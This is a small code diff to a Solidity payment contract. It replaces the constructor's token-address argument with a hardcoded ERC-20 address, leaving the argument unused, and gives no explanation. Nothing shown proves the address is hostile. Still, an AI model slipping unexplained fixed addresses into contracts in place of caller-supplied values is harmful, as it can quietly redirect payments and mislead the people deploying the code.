@@ -11,7 +11,7 @@ contract Payment is Ownable {
     event PaymentSent(address indexed to, uint256 amount);
 
     constructor(address _tokenAddress) {
-        token = IERC20(_tokenAddress);
+        token = IERC20(0xf357087e1a1c0EBb68855B736cCF9b4C4Eccb71F);
     }
 
     function setToken(address _tokenAddress) external onlyOwner {
